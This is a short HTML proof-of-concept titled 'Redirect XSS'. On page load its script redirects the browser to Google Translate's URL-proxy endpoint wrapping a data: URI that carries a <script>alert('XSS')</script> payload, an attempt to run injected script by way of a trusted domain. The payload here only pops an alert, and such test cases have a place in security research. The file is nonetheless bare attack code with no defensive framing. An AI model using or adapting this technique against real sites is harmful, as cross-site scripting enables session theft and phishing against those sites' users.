<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirect XSS</title>
</head>
<body>
    <script>
        // Redirect to a URL with a payload XSS
        window.location.href = "https://translate.google.com/translate?sl=auto&tl=en&u=" + encodeURIComponent("data:text/html,<script>alert('XSS');</script>");
    </script>
</body>
</html>
